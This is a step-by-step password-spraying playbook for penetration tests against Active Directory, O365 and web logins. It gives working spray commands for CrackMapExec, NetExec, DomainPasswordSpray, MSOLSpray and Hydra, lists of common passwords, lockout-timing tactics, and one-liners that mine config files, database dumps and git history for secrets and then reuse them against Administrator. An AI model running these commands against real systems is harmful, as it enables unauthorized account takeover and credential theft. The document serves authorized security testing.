# Password Attacks — Password Spraying

## When this applies

- Account lockout policy in place: brute-forcing one user locks them out after N attempts.
- Goal: find at least one valid credential from a large user population without locking accounts.

## Technique

Test 1–3 common passwords across MANY users. Each user receives only a few attempts (well below lockout threshold), but cumulatively the attack covers thousands of accounts. Statistically, ~1–5% of users have weak passwords — spraying finds these.

## Steps

### 1. Enumerate valid usernames

Sources:
- AD enumeration via `nxc smb DC --rid-brute` or LDAP queries.
- LinkedIn for company employees.
- Email harvesting (Hunter.io, theHarvester).
- OWA / O365 username probing (returns timing differences).

### 2. Identify lockout policy

```bash
# AD
nxc smb DC -u user -p '' --pass-pol
# Returns: lockout threshold, observation window, lockout duration

# Default Windows: 5 failures, 30-min lockout
# Default O365: 10 failures, 60-sec auto-unlock
```

### 3. Choose 1-3 spray passwords

| Pattern | Examples |
|---|---|
| Generic | `Password1`, `Welcome1`, `Summer2024!` |
| Company + year | `Acme2024!`, `<CompanyName>1` |
| Seasonal | `Spring2024!`, `Winter2024` |
| Default | `Changeme1`, `Welcome123` |

### 4. CrackMapExec spray (SMB/RDP/WinRM/MSSQL)

```bash
# Single password against many users
crackmapexec smb target.com -u users.txt -p 'Summer2024!' --continue-on-success

# With timing
crackmapexec smb target.com -u users.txt -p 'Password1' --continue-on-success --jitter 1-3
```

### 5. DomainPasswordSpray (PowerShell, AD)

```powershell
Import-Module .\DomainPasswordSpray.ps1

# Single password
Invoke-DomainPasswordSpray -Password 'Summer2024!'

# Multiple passwords (cycle through)
Invoke-DomainPasswordSpray -PasswordList passwords.txt

# Custom user list
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Welcome1'
```

### 6. O365 / Azure AD spraying

```powershell
# MSOLSpray (PowerShell)
.\MSOLSpray.ps1 -UserList users.txt -Password 'Summer2024!'

# Spray365
python3 spray365.py spray --user-list users.txt --password 'Summer2024!' --tenant target.onmicrosoft.com
```

### 7. Custom spray with delay

```bash
# Hydra in a loop with explicit delay
for user in $(cat users.txt); do
  hydra -l "$user" -p 'Password123!' target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
  sleep 1800   # 30-min delay between users
done
```

### 8. Safe lockout calculations

Example policy: 5 failed attempts, 30-minute observation window.

| Strategy | Risk |
|---|---|
| 1 spray attempt per user per hour | Safe — 1 attempt resets after 30 min |
| 2 attempts per 30-min window | Borderline — 2nd attempt counted before reset |
| 3+ attempts per 30-min window | Unsafe — locks accounts |

Always count attempts per user against lockout threshold; spread spray over hours/days.

### 9. Time-based spray (monthly password rotation)

If passwords rotate monthly (`Spring2024 → Summer2024`), spray relevant seasonal:

```python
import datetime
season_map = {12:'Winter', 1:'Winter', 2:'Winter',
              3:'Spring', 4:'Spring', 5:'Spring',
              6:'Summer', 7:'Summer', 8:'Summer',
              9:'Autumn', 10:'Autumn', 11:'Autumn'}
season = season_map[datetime.date.today().month]
year = datetime.date.today().year
password = f"{season}{year}!"
```

### 10. Identify successful sprays

```bash
# CrackMapExec output
[+] domain\victim:Summer2024! (Pwn3d!)         # successful, admin
[+] domain\user:Summer2024!                     # successful, non-admin
[-] domain\locked:Summer2024! STATUS_ACCOUNT_LOCKED_OUT
```

Document the user, password, and any privilege escalation path.

### 11. SMB null-session pre-spray

```bash
# Anonymous bind to enumerate users (no spray yet)
nxc smb DC -u '' -p '' --rid-brute
nxc smb DC -u '' -p '' --users
```

### 12. Cross-protocol reuse from leaked credential dumps

Once a public, SSRF-reachable, or LFI-readable resource leaks plaintext passwords (S3 bucket, `.git`, env file, app DB dump, cloud-emulator DynamoDB table), the passwords become spray candidates against **every other auth surface** in the engagement — not just the originating app. This is often the single highest-ROI pivot in cloud + AD hybrid environments.

Sources to mine:
- S3 buckets named `databases/`, `backups/`, `dumps/` — pull every `.db`, `.sqlite`, `.sql`, `.bak`.
- `.env`, `config.php`, `settings.py`, `appsettings.json` retrieved via LFI or directory listing.
- DynamoDB `users` / `customers` tables (LocalStack / moto defaults).
- `pg_dump` / `mysqldump` files dropped in a writable webroot.
- `Airflow` connections table, `Jenkins` credential store, `Vault` audit logs.

Extract `(username, password)` pairs:

```bash
# Generic sqlite mining
sqlite3 users.db ".dump" | grep -iE 'INSERT.*(user|pass|email)'

# JSON / YAML configs
grep -RiE '(password|passwd|secret|pwd)\s*[=:]\s*["\047]?[^"\047\s]{6,}' .

# .git history
git log -p --all | grep -iE 'password|secret|api[_-]?key' -B2 -A2
```

Spray candidates against EVERY auth surface, especially:

| Target | Tool | Why |
|---|---|---|
| AD via LDAP / SMB / WinRM | `nxc smb <DC> -u users.txt -p pw.txt` | App users reuse the same password for their AD account |
| MS SQL / MySQL / PostgreSQL | `nxc mssql ...`, `mysql -u ... -p ...` | DB admin shares the application password |
| SSH | `hydra ssh://<host> -L users.txt -P pw.txt` | OS user shares the app password |
| O365 / Azure AD | `MSOLSpray` | Personal-account reuse |
| Internal apps (Mattermost, Gitea, Jenkins) | App API login | Devs reuse one password everywhere |

Cross-product every recovered password against every domain user — including `Administrator` and well-known privileged principals even when they don't appear in the leak:

```bash
# All recovered passwords × all known domain users
echo "Administrator" >> ad_users.txt   # always include even if not in the leak
for pw in $(cat leaked_passwords.txt); do
  nxc smb <DC_IP> -u ad_users.txt -p "$pw" --continue-on-success 2>&1 | grep -E '\[\+\]'
done
```

The pivot that often unlocks domain admin: **one app user's password = `Administrator`'s password**. A predecessor finding a leaked DB but only treating it as "credentials for app X" leaves the entire AD compromise on the table.

## Verifying success

- CrackMapExec returns `[+]` for valid combinations.
- Manual login with the discovered credential succeeds.
- The account isn't locked when you authenticate (control test).

## Common pitfalls

- Lockout policies vary per OU / domain / fine-grained password policy. Pull the actual policy before spraying.
- Spraying admin accounts may use stricter lockouts — exclude them from spray, target separately.
- Some targets (e.g. service accounts with non-expiring passwords) may have NEVER been rotated — try old defaults too.
- Heavy noise — IDS / SIEM will alert on spray patterns. Coordinate with engagement contact.
- Some endpoints (web SSO) are not the auth surface; authenticate via LDAP/SMB instead.

## Tools

- CrackMapExec / NetExec (bulk SMB / WinRM / RDP / MSSQL spraying).
- DomainPasswordSpray.ps1 (AD).
- MSOLSpray, Spray365, AADInternals (Azure AD / O365).
- kerbrute (Kerberos pre-auth spraying — single-packet, very stealthy).
- Hydra (web forms with explicit timing).

## References

- MITRE ATT&CK T1110.003 (Password Spraying).
- CWE-307.
- CAPEC-565 (Password Spraying).
